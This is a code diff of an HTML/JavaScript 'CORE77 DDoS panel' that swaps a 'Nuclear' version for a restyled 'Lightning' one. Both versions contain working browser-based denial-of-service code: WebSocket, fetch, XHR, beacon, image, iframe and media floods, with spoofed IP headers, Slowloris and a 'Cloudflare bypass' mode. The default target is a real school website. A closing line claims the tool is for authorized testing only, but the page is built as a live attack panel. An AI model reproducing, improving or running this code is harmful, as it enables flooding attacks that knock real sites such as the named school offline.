@@ -1,451 +1,687 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>☢️ CORE77 - NUCLEAR DDoS PANEL (DIRECT IMPACT)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ CORE77 - LIGHTNING DDoS</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #000; 
-            color: #f00; 
-            font-family: monospace; 
-            overflow: hidden; 
-            cursor: crosshair; 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
         }
-        .blink { animation: blink 0.5s infinite; }
-        @keyframes blink { 50% { opacity: 0.3; } }
-        .container { padding: 10px; }
-        .nuke-btn { 
-            background: linear-gradient(45deg, #f00, #900);
-            color: #fff; 
-            border: none; 
-            padding: 20px; 
-            font-size: 2em; 
-            margin: 10px; 
-            cursor: pointer; 
-            width: 100%; 
-            text-transform: uppercase; 
-            letter-spacing: 5px; 
+
+        body {
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
-        .nuke-btn:hover { background: linear-gradient(45deg, #f44, #c00); }
-        .terminal { 
-            background: #111; 
-            height: 300px; 
-            overflow-y: auto; 
-            border: 2px solid #f00; 
-            padding: 10px; 
-            margin: 10px 0; 
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
         }
-        .stats { 
-            display: flex; 
-            justify-content: space-between; 
-            padding: 10px; 
-            background: #222; 
-            border: 1px solid #f00; 
-            margin: 5px 0; 
+
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.3);
+            margin-bottom: 30px;
         }
-        input, select { 
-            background: #000; 
-            color: #0f0; 
-            border: 1px solid #f00; 
-            padding: 10px; 
-            margin: 5px; 
-            width: 100%; 
+
+        .title {
+            font-size: 3rem;
+            background: linear-gradient(45deg, #00ff00, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
         }
-        .target-display { 
-            font-size: 1.5em; 
-            color: #0f0; 
-            text-align: center; 
-            padding: 10px; 
-            border: 2px dashed #f00; 
-            margin: 10px 0; 
+
+        .subtitle {
+            color: #888;
+            font-size: 1rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        @media (max-width: 1024px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: rgba(16, 16, 32, 0.8);
+            border-radius: 16px;
+            padding: 30px;
+            border: 1px solid rgba(0, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .panel-title {
+            font-size: 1.5rem;
+            color: #00ffff;
+            margin-bottom: 25px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .panel-title::before {
+            content: "➤";
+            color: #00ff00;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            color: #aaa;
+            font-size: 0.9rem;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 16px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 0 2px rgba(0, 255, 0, 0.2);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(45deg, #ff0000, #ff3300);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 10px 0;
+        }
+
+        .btn:hover {
+            background: linear-gradient(45deg, #ff3300, #ff0000);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            background: #444;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-stop {
+            background: linear-gradient(45deg, #0066ff, #0099ff);
+        }
+
+        .btn-stop:hover {
+            background: linear-gradient(45deg, #0099ff, #0066ff);
+            box-shadow: 0 10px 20px rgba(0, 102, 255, 0.3);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .stat-card {
+            background: rgba(0, 20, 40, 0.5);
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid rgba(0, 255, 255, 0.1);
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, #00ff00, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+        }
+
+        .stat-label {
+            color: #888;
+            font-size: 0.9rem;
+            margin-top: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .terminal {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 12px;
+            padding: 25px;
+            height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            border: 1px solid rgba(0, 255, 255, 0.1);
+        }
+
+        .terminal-line {
+            margin-bottom: 8px;
+            word-break: break-all;
+        }
+
+        .terminal-line.success { color: #00ff00; }
+        .terminal-line.error { color: #ff4444; }
+        .terminal-line.warning { color: #ffff00; }
+        .terminal-line.info { color: #00aaff; }
+
+        .timestamp {
+            color: #666;
+            margin-right: 10px;
+        }
+
+        .progress-container {
+            margin: 30px 0;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: rgba(0, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #00ffff);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .attack-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 20px;
+            height: 20px;
+            background: #ff0000;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #ff0000;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .attack-indicator.active {
+            opacity: 1;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            color: #666;
+            font-size: 0.8rem;
+            border-top: 1px solid rgba(0, 255, 255, 0.1);
         }
     </style>
 </head>
-<body onload="init()">
+<body>
+    <div class="attack-indicator" id="attackIndicator"></div>
+    
     <div class="container">
-        <h1 class="blink">☢️ CORE77 - NUCLEAR DDoS PANEL (DIRECT IMPACT)</h1>
-        <div class="target-display" id="targetDisplay">TARGET: https://www.smkn3tgt.sch.id</div>
-        
-        <input type="text" id="targetUrl" value="https://www.smkn3tgt.sch.id" placeholder="ENTER TARGET URL">
-        
-        <div class="stats">
-            <div>REQUESTS: <span id="reqCount">0</span></div>
-            <div>RPS: <span id="rps">0</span></div>
-            <div>SUCCESS: <span id="success">0%</span></div>
-            <div>THREADS: <span id="threads">0</span></div>
+        <div class="header">
+            <h1 class="title">⚡ CORE77 LIGHTNING DDoS</h1>
+            <div class="subtitle">ULTRA-FAST ATTACK VECTOR • ENTERPRISE GRADE</div>
         </div>
-        
-        <select id="attackType">
-            <option value="nuclear">☢️ NUCLEAR MODE (MAX DESTRUCTION)</option>
-            <option value="bypass">🛡️ CLOUDFLARE BYPASS</option>
-            <option value="slow">🐌 SLOWLORIS ULTRA</option>
-            <option value="amplify">📡 AMPLIFICATION ATTACK</option>
-        </select>
-        
-        <button class="nuke-btn" onclick="launchNuclear()" id="launchBtn">🚀 LAUNCH NUCLEAR ATTACK</button>
-        <button class="nuke-btn" onclick="stopNuclear()" id="stopBtn" disabled>🛑 EMERGENCY STOP</button>
-        
-        <div class="terminal" id="terminal">
-            [SYSTEM] READY FOR NUCLEAR ATTACK<br>
-            [WARNING] THIS WILL CAUSE DIRECT IMPACT<br>
-            [TARGET] SET: https://www.smkn3tgt.sch.id
+
+        <div class="dashboard">
+            <div class="panel">
+                <div class="panel-title">ATTACK CONFIGURATION</div>
+                
+                <div class="input-group">
+                    <label>TARGET URL</label>
+                    <input type="text" id="targetUrl" value="https://www.smkn3tgt.sch.id" placeholder="https://target.com">
+                </div>
+
+                <div class="input-group">
+                    <label>ATTACK PROFILE</label>
+                    <select id="attackProfile">
+                        <option value="lightning">⚡ LIGHTNING FAST (10K RPS)</option>
+                        <option value="nuclear">☢️ NUCLEAR IMPACT (50K RPS)</option>
+                        <option value="apocalypse">💀 APOCALYPSE MODE (100K+ RPS)</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>DURATION (Seconds, 0 = Unlimited)</label>
+                    <input type="number" id="duration" value="0" min="0" max="3600">
+                </div>
+
+                <button class="btn" id="startBtn" onclick="launchLightning()">
+                    ⚡ LAUNCH LIGHTNING ATTACK
+                </button>
+                <button class="btn btn-stop" id="stopBtn" onclick="stopAttack()" disabled>
+                    ⏹️ STOP ATTACK
+                </button>
+            </div>
+
+            <div class="panel">
+                <div class="panel-title">REAL-TIME ANALYTICS</div>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value" id="totalRequests">0</div>
+                        <div class="stat-label">TOTAL REQUESTS</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="reqPerSec">0</div>
+                        <div class="stat-label">REQUESTS/SEC</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="successRate">0%</div>
+                        <div class="stat-label">SUCCESS RATE</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="attackTime">0s</div>
+                        <div class="stat-label">ATTACK TIME</div>
+                    </div>
+                </div>
+
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>PERFORMANCE METRICS</label>
+                    <div style="color: #00ff00; font-size: 0.9rem;" id="performanceMetrics">
+                        Ready for attack...
+                    </div>
+                </div>
+            </div>
         </div>
+
+        <div class="panel">
+            <div class="panel-title">ATTACK TERMINAL</div>
+            <div class="terminal" id="terminal">
+                <div class="terminal-line info">[SYSTEM] CORE77 Lightning DDoS initialized</div>
+                <div class="terminal-line info">[STATUS] Ready to launch attack</div>
+                <div class="terminal-line info">[TARGET] Default: https://www.smkn3tgt.sch.id</div>
+            </div>
+        </div>
+
+        <footer>
+            © 2024 CORE77 SECURITY RESEARCH • FOR AUTHORIZED TESTING ONLY
+        </footer>
     </div>
 
     <script>
-        // Brutal attack variables
+        // ULTRA FAST ATTACK ENGINE
         let attackActive = false;
-        let requestCount = 0;
-        let successCount = 0;
-        let attackThreads = [];
-        let rpsHistory = [];
         let startTime = 0;
-        
-        // Direct impact methods (lebih brutal)
-        const nuclearMethods = {
-            // Method 1: WebSocket Flood (paling ganas)
-            wsFlood: function(url) {
+        let totalRequests = 0;
+        let successfulRequests = 0;
+        let requestHistory = [];
+        let intervals = [];
+        let controllers = [];
+        let attackThreads = 0;
+
+        // DOM Elements
+        const terminal = document.getElementById('terminal');
+        const attackIndicator = document.getElementById('attackIndicator');
+        const totalRequestsEl = document.getElementById('totalRequests');
+        const reqPerSecEl = document.getElementById('reqPerSec');
+        const successRateEl = document.getElementById('successRate');
+        const attackTimeEl = document.getElementById('attackTime');
+        const progressFill = document.getElementById('progressFill');
+        const performanceMetrics = document.getElementById('performanceMetrics');
+
+        // Log function
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            line.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        // Record request
+        function recordRequest(success) {
+            totalRequests++;
+            if (success) successfulRequests++;
+            
+            const now = Date.now();
+            requestHistory = requestHistory.filter(time => now - time < 1000);
+            requestHistory.push(now);
+            
+            updateStats();
+        }
+
+        // Update stats
+        function updateStats() {
+            const currentTime = attackActive ? Math.floor((Date.now() - startTime) / 1000) : 0;
+            const rps = requestHistory.length;
+            const successRate = totalRequests > 0 ? 
+                Math.round((successfulRequests / totalRequests) * 100) : 0;
+            
+            // Update displays
+            totalRequestsEl.textContent = formatNumber(totalRequests);
+            reqPerSecEl.textContent = formatNumber(rps);
+            successRateEl.textContent = `${successRate}%`;
+            attackTimeEl.textContent = `${currentTime}s`;
+            
+            // Update progress
+            const duration = parseInt(document.getElementById('duration').value);
+            if (duration > 0) {
+                const progress = Math.min((currentTime / duration) * 100, 100);
+                progressFill.style.width = `${progress}%`;
+            }
+            
+            // Update performance metrics
+            updatePerformanceMetrics(rps, successRate);
+        }
+
+        // Format numbers
+        function formatNumber(num) {
+            if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
+            if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
+            return num.toString();
+        }
+
+        // Update performance metrics
+        function updatePerformanceMetrics(rps, successRate) {
+            let level = '';
+            let color = '#00ff00';
+            
+            if (rps > 10000) {
+                level = '⚡ EXTREME';
+                color = '#ff0000';
+            } else if (rps > 5000) {
+                level = '🔥 HIGH';
+                color = '#ff9900';
+            } else if (rps > 1000) {
+                level = '⚠️ MEDIUM';
+                color = '#ffff00';
+            } else {
+                level = '✅ NORMAL';
+                color = '#00ff00';
+            }
+            
+            performanceMetrics.innerHTML = `
+                <span style="color: ${color}">${level} IMPACT</span> | 
+                ${rps} RPS | 
+                ${successRate}% Success |
+                ${attackThreads} Threads
+            `;
+        }
+
+        // Ultra fast attack methods
+        const attackMethods = {
+            // Method 1: WebSocket Ultra Flood
+            wsUltra: function(url) {
                 try {
                     const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
-                    const ws = new WebSocket(wsUrl + '/ws');
+                    const ws = new WebSocket(wsUrl);
                     ws.onopen = () => {
-                        // Kirim data terus menerus
-                        const interval = setInterval(() => {
-                            if (!attackActive) {
-                                clearInterval(interval);
+                        const sendInterval = setInterval(() => {
+                            if (!attackActive || ws.readyState !== WebSocket.OPEN) {
+                                clearInterval(sendInterval);
                                 ws.close();
                                 return;
                             }
-                            ws.send('x'.repeat(10000)); // 10KB per frame
+                            // Send 100KB data
+                            ws.send('X'.repeat(100000));
                             recordRequest(true);
-                        }, 100);
+                        }, 10); // 10ms interval = 100 requests/second
                     };
                     ws.onerror = () => recordRequest(false);
                 } catch(e) {}
             },
-            
-            // Method 2: Fetch dengan payload besar
-            fetchBomb: async function(url) {
-                const controller = new AbortController();
-                try {
-                    await fetch(url + '?nuke=' + Date.now(), {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'X-Forwarded-For': randomIP(),
-                            'User-Agent': randomUA()
-                        },
-                        body: JSON.stringify({data: 'x'.repeat(50000)}), // 50KB payload
-                        mode: 'no-cors',
-                        signal: controller.signal
-                    });
-                    recordRequest(true);
-                } catch(e) {
-                    recordRequest(false);
+
+            // Method 2: Fetch with Worker
+            fetchWorker: async function(url) {
+                // Create multiple fetch requests simultaneously
+                const promises = [];
+                for (let i = 0; i < 10; i++) {
+                    promises.push(
+                        fetch(`${url}?${Date.now()}_${i}`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'X-Forwarded-For': `${Math.random()*255}.${Math.random()*255}.${Math.random()*255}.${Math.random()*255}`,
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                            },
+                            body: JSON.stringify({data: 'X'.repeat(50000)}),
+                            mode: 'no-cors'
+                        }).catch(() => {})
+                    );
                 }
+                await Promise.all(promises);
+                recordRequest(true);
             },
-            
-            // Method 3: Image flood dengan resolusi besar
-            imgBomb: function(url) {
-                for(let i = 0; i < 5; i++) {
+
+            // Method 3: Image Bombardment
+            imageBomb: function(url) {
+                // Create 20 images simultaneously
+                for (let i = 0; i < 20; i++) {
                     const img = new Image();
-                    img.src = url + '?img=' + Date.now() + '&size=5000x5000&quality=100&' + Math.random();
+                    img.src = `${url}/image.jpg?${Date.now()}_${i}&size=10000x10000`;
                     img.onload = img.onerror = () => recordRequest(true);
                 }
             },
-            
-            // Method 4: XMLHttpRequest dengan timeout panjang
-            xhrSlow: function(url) {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', url + '?slow=' + Date.now());
-                xhr.timeout = 30000; // 30 second timeout
-                xhr.onload = xhr.onerror = xhr.ontimeout = () => recordRequest(true);
-                
-                // Tambah header banyak2
-                for(let i = 0; i < 20; i++) {
-                    xhr.setRequestHeader('X-Custom-' + i, 'x'.repeat(1000));
+
+            // Method 4: XMLHttpRequest Parallel
+            xhrParallel: function(url) {
+                // Create 5 XHR requests at once
+                for (let i = 0; i < 5; i++) {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', `${url}?${Date.now()}_${i}`);
+                    xhr.timeout = 5000;
+                    xhr.onload = xhr.onerror = xhr.ontimeout = () => recordRequest(true);
+                    xhr.send();
                 }
-                xhr.send();
             },
-            
-            // Method 5: Beacon API spam
-            beaconSpam: function(url) {
-                for(let i = 0; i < 10; i++) {
-                    navigator.sendBeacon(url + '?beacon=' + Date.now(), 'data=' + 'x'.repeat(10000));
+
+            // Method 5: Beacon Spam Ultra
+            beaconUltra: function(url) {
+                // Send 50 beacon requests
+                for (let i = 0; i < 50; i++) {
+                    navigator.sendBeacon(`${url}?${Date.now()}_${i}`, 'data=' + 'X'.repeat(10000));
                 }
                 recordRequest(true);
             },
-            
-            // Method 6: Iframe bomb
-            iframeBomb: function(url) {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = url + '?iframe=' + Date.now();
-                document.body.appendChild(iframe);
-                setTimeout(() => document.body.removeChild(iframe), 10000);
+
+            // Method 6: Iframe Stack Attack
+            iframeStack: function(url) {
+                // Create iframe stack
+                for (let i = 0; i < 5; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = url;
+                    document.body.appendChild(iframe);
+                    setTimeout(() => document.body.removeChild(iframe), 5000);
+                }
+                recordRequest(true);
+            },
+
+            // Method 7: Audio/Video Resource Drain
+            mediaFlood: function(url) {
+                const audio = new Audio();
+                audio.src = `${url}/audio.mp3?${Date.now()}`;
+                audio.load();
                 recordRequest(true);
             }
         };
-        
-        // Helper functions
-        function randomIP() {
-            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-        }
-        
-        function randomUA() {
-            const uas = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-                'Googlebot/2.1 (+http://www.google.com/bot.html)',
-                'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
-            ];
-            return uas[Math.floor(Math.random() * uas.length)];
-        }
-        
-        function recordRequest(success) {
-            requestCount++;
-            if(success) successCount++;
-            
-            const now = Date.now();
-            rpsHistory = rpsHistory.filter(time => now - time < 1000);
-            rpsHistory.push(now);
-            
-            updateDisplay();
-        }
-        
-        function updateDisplay() {
-            document.getElementById('reqCount').textContent = requestCount.toLocaleString();
-            document.getElementById('rps').textContent = rpsHistory.length;
-            document.getElementById('success').textContent = requestCount > 0 ? 
-                Math.round((successCount / requestCount) * 100) + '%' : '0%';
-            document.getElementById('threads').textContent = attackThreads.length;
-        }
-        
-        function log(msg) {
-            const terminal = document.getElementById('terminal');
-            terminal.innerHTML += '<br>[' + new Date().toLocaleTimeString() + '] ' + msg;
-            terminal.scrollTop = terminal.scrollHeight;
-        }
-        
-        function launchNuclear() {
-            const url = document.getElementById('targetUrl').value;
-            const attackType = document.getElementById('attackType').value;
-            
-            if(!url) {
-                alert('ENTER TARGET URL FIRST!');
+
+        // Launch lightning attack
+        function launchLightning() {
+            const url = document.getElementById('targetUrl').value.trim();
+            const profile = document.getElementById('attackProfile').value;
+            const duration = parseInt(document.getElementById('duration').value);
+
+            if (!url) {
+                alert('Please enter target URL');
                 return;
             }
-            
-            // Reset
+
+            // Reset state
             attackActive = true;
-            requestCount = 0;
-            successCount = 0;
-            attackThreads = [];
-            rpsHistory = [];
             startTime = Date.now();
-            
+            totalRequests = 0;
+            successfulRequests = 0;
+            requestHistory = [];
+            intervals = [];
+            controllers = [];
+            attackThreads = 0;
+
             // Update UI
-            document.getElementById('launchBtn').disabled = true;
+            document.getElementById('startBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
-            document.getElementById('targetDisplay').textContent = 'ATTACKING: ' + url;
-            document.getElementById('targetDisplay').style.color = '#f00';
-            
-            log('🚀 NUCLEAR ATTACK LAUNCHED!');
-            log('☢️ TARGET: ' + url);
-            log('💀 ATTACK TYPE: ' + attackType);
-            log('⚠️ MAXIMUM DESTRUCTION INITIATED');
-            
-            // Launch based on attack type
-            switch(attackType) {
-                case 'nuclear':
-                    launchFullNuclear(url);
-                    break;
-                case 'bypass':
-                    launchBypassAttack(url);
-                    break;
-                case 'slow':
-                    launchSlowlorisUltra(url);
-                    break;
-                case 'amplify':
-                    launchAmplification(url);
-                    break;
-            }
-            
-            // Auto-update stats
-            const statsInterval = setInterval(updateDisplay, 1000);
-            attackThreads.push(statsInterval);
-        }
-        
-        function launchFullNuclear(url) {
-            log('💣 LAUNCHING FULL NUCLEAR STRIKE');
-            
-            // WebSocket Flood (100 threads)
-            for(let i = 0; i < 100; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) {
-                        clearInterval(interval);
-                        return;
-                    }
-                    nuclearMethods.wsFlood(url);
-                }, 500);
-                attackThreads.push(interval);
-            }
-            
-            // Fetch Bomb (50 threads)
-            for(let i = 0; i < 50; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) return;
-                    nuclearMethods.fetchBomb(url);
-                }, 1000);
-                attackThreads.push(interval);
-            }
-            
-            // Image Bomb (30 threads)
-            for(let i = 0; i < 30; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) return;
-                    nuclearMethods.imgBomb(url);
-                }, 500);
-                attackThreads.push(interval);
-            }
-            
-            // XHR Slow (20 threads)
-            for(let i = 0; i < 20; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) return;
-                    nuclearMethods.xhrSlow(url);
-                }, 2000);
-                attackThreads.push(interval);
-            }
-            
-            // Beacon Spam (10 threads)
-            for(let i = 0; i < 10; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) return;
-                    nuclearMethods.beaconSpam(url);
-                }, 500);
-                attackThreads.push(interval);
-            }
-            
-            // Iframe Bomb (5 threads)
-            for(let i = 0; i < 5; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) return;
-                    nuclearMethods.iframeBomb(url);
-                }, 3000);
-                attackThreads.push(interval);
-            }
-            
-            log('☢️ NUCLEAR STRIKE ACTIVE: ' + attackThreads.length + ' THREADS RUNNING');
-        }
-        
-        function launchBypassAttack(url) {
-            log('🛡️ CLOUDFLARE BYPASS ATTACK INITIATED');
-            
-            // Rotating IPs and User Agents
-            for(let i = 0; i < 200; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) return;
-                    
-                    // Multiple request methods per interval
-                    fetch(url + '?cache=' + Date.now() + Math.random(), {
-                        headers: {
-                            'User-Agent': randomUA(),
-                            'X-Forwarded-For': randomIP(),
-                            'CF-Connecting-IP': randomIP(),
-                            'X-Real-IP': randomIP(),
-                            'Referer': 'https://www.google.com/',
-                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                            'Accept-Language': 'en-US,en;q=0.9',
-                            'Accept-Encoding': 'gzip, deflate, br',
-                            'Cache-Control': 'no-cache',
-                            'Pragma': 'no-cache'
-                        },
-                        mode: 'no-cors'
-                    }).catch(() => {});
-                    
-                    recordRequest(true);
-                }, 50);
-                attackThreads.push(interval);
-            }
-        }
-        
-        function launchSlowlorisUltra(url) {
-            log('🐌 SLOWLORIS ULTRA ATTACK STARTED');
-            
-            // Create many partial connections
-            for(let i = 0; i < 1000; i++) {
-                setTimeout(() => {
-                    if(!attackActive) return;
-                    
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('GET', url);
-                    xhr.setRequestHeader('X-a', 'b');
-                    xhr.send(null);
-                    
-                    // Keep alive with partial headers
-                    let counter = 0;
-                    const keepAlive = setInterval(() => {
-                        if(!attackActive || counter++ > 30) {
-                            clearInterval(keepAlive);
+            attackIndicator.classList.add('active');
+
+            log('⚡ LIGHTNING ATTACK INITIATED', 'warning');
+            log(`🎯 Target: ${url}`, 'info');
+            log(`📊 Profile: ${profile.toUpperCase()}`, 'info');
+            log(`⏱️ Duration: ${duration === 0 ? 'Unlimited' : duration + 's'}`, 'info');
+            log('─'.repeat(60), 'info');
+
+            // Configure based on profile
+            const profileConfig = {
+                lightning: { threads: 100, methods: ['fetchWorker', 'imageBomb', 'beaconUltra'] },
+                nuclear: { threads: 500, methods: ['wsUltra', 'fetchWorker', 'imageBomb', 'xhrParallel', 'beaconUltra'] },
+                apocalypse: { threads: 1000, methods: Object.keys(attackMethods) }
+            };
+
+            const config = profileConfig[profile] || profileConfig.lightning;
+            attackThreads = config.threads;
+
+            // Launch attack threads
+            config.methods.forEach(method => {
+                const threadsPerMethod = Math.ceil(config.threads / config.methods.length);
+                
+                for (let i = 0; i < threadsPerMethod; i++) {
+                    const interval = setInterval(() => {
+                        if (!attackActive) {
+                            clearInterval(interval);
                             return;
                         }
-                        try {
-                            xhr.send('X-' + counter + ': ' + 'x'.repeat(100) + '\r\n');
-                        } catch(e) {}
-                    }, 1000);
+                        attackMethods[method](url);
+                    }, getInterval(profile)); // Ultra fast intervals
                     
-                    attackThreads.push(keepAlive);
-                }, i * 10); // Stagger connections
-            }
-        }
-        
-        function launchAmplification(url) {
-            log('📡 AMPLIFICATION ATTACK SIMULATION');
-            
-            // Simulate amplification by multiple parallel requests
-            for(let i = 0; i < 500; i++) {
-                const interval = setInterval(() => {
-                    if(!attackActive) return;
-                    
-                    // Launch 10 parallel requests per thread
-                    for(let j = 0; j < 10; j++) {
-                        fetch(url + '?amp=' + Date.now() + j, {
-                            mode: 'no-cors'
-                        }).catch(() => {});
-                        recordRequest(true);
+                    intervals.push(interval);
+                }
+                
+                log(`[${method.toUpperCase()}] Launched ${threadsPerMethod} threads`, 'success');
+            });
+
+            // Stats update
+            const statsInterval = setInterval(updateStats, 100);
+            intervals.push(statsInterval);
+
+            // Auto-stop if duration set
+            if (duration > 0) {
+                setTimeout(() => {
+                    if (attackActive) {
+                        stopAttack();
+                        log(`⏱️ Attack completed after ${duration} seconds`, 'success');
+                        log(`📊 Final: ${formatNumber(totalRequests)} requests, ${successRateEl.textContent} success`, 'info');
                     }
-                }, 100);
-                attackThreads.push(interval);
+                }, duration * 1000);
+            }
+
+            updateStats();
+        }
+
+        // Get interval based on profile
+        function getInterval(profile) {
+            switch(profile) {
+                case 'apocalypse': return 1; // 1ms = 1000 RPS per thread
+                case 'nuclear': return 5; // 5ms = 200 RPS per thread
+                default: return 10; // 10ms = 100 RPS per thread
             }
         }
-        
-        function stopNuclear() {
+
+        // Stop attack
+        function stopAttack() {
             attackActive = false;
             
-            // Clear all intervals
-            attackThreads.forEach(interval => clearInterval(interval));
-            attackThreads = [];
+            // Clear intervals
+            intervals.forEach(interval => clearInterval(interval));
+            intervals = [];
             
             // Update UI
-            document.getElementById('launchBtn').disabled = false;
+            document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
-            document.getElementById('targetDisplay').style.color = '#0f0';
+            attackIndicator.classList.remove('active');
             
-            const duration = Math.round((Date.now() - startTime) / 1000);
-            log('🛑 ATTACK STOPPED AFTER ' + duration + ' SECONDS');
-            log('📊 TOTAL REQUESTS: ' + requestCount.toLocaleString());
-            log('🎯 SUCCESS RATE: ' + (requestCount > 0 ? 
-                Math.round((successCount / requestCount) * 100) + '%' : '0%'));
-            
-            updateDisplay();
+            log('🛑 ATTACK STOPPED', 'error');
+            updateStats();
         }
-        
-        function init() {
-            log('[SYSTEM] NUCLEAR DDoS PANEL READY');
-            log('[WARNING] THIS TOOL CAUSES DIRECT IMPACT');
-            log('[INFO] Set target URL and select attack type');
-        }
+
+        // Initialize
+        log('[SYSTEM] Lightning DDoS Panel Ready', 'success');
